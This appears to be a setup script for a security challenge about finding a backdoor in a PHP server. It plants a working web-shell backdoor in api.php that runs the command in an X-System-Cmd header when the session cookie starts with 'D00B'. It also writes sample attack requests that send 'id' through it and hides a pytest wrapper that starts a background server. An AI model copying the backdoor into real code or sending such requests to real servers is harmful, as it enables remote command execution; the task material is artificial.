#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip espeak
    pip3 install pytest

    # Create directories
    mkdir -p /app/server /app/hidden /app/corpus/evil /app/corpus/clean

    # Create dummy PHP files
    echo "<?php echo 'Index'; ?>" > /app/server/index.php
    echo "<?php echo 'Login'; ?>" > /app/server/login.php
    echo "<?php echo 'Config'; ?>" > /app/server/config.php
    echo "<?php echo 'API'; ?>" > /app/server/api.php

    # Generate manifest with original hashes
    cd /app/server && sha256sum *.php > /app/hidden/manifest.sha256

    # Modify api.php to include the backdoor
    cat << 'EOF' > /app/server/api.php
<?php
echo 'API';
if (isset($_COOKIE['session']) && strpos($_COOKIE['session'], 'D00B') === 0) {
    if (isset($_SERVER['HTTP_X_SYSTEM_CMD'])) {
        system($_SERVER['HTTP_X_SYSTEM_CMD']);
    }
}
?>
EOF

    # Generate audio file
    espeak -w /app/voip_intercept.wav "The magic prefix is delta zero zero bravo"

    # Generate corpus files
    python3 -c '
import os
for i in range(50):
    with open(f"/app/corpus/evil/req_{i}.txt", "w") as f:
        f.write(f"GET /api.php HTTP/1.1\r\nHost: localhost\r\nCookie: session=D00B{i}\r\nX-System-Cmd: id\r\n\r\n")

    with open(f"/app/corpus/clean/req_{i}.txt", "w") as f:
        if i % 3 == 0:
            f.write(f"GET /api.php HTTP/1.1\r\nHost: localhost\r\nCookie: session=D00B{i}\r\n\r\n")
        elif i % 3 == 1:
            f.write(f"GET /api.php HTTP/1.1\r\nHost: localhost\r\nCookie: session=ABCD{i}\r\nX-System-Cmd: id\r\n\r\n")
        else:
            f.write(f"GET /api.php HTTP/1.1\r\nHost: localhost\r\nCookie: session=ABCD{i}\r\n\r\n")
'

    # Create a wrapper for pytest to start the background service
    mv /usr/local/bin/pytest /usr/local/bin/pytest.real
    cat << 'EOF' > /usr/local/bin/pytest
#!/bin/bash
nohup python3 -m http.server 8042 --directory /app/hidden >/dev/null 2>&1 &
sleep 1
exec /usr/local/bin/pytest.real "$@"
EOF
    chmod +x /usr/local/bin/pytest

    # Create user
    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
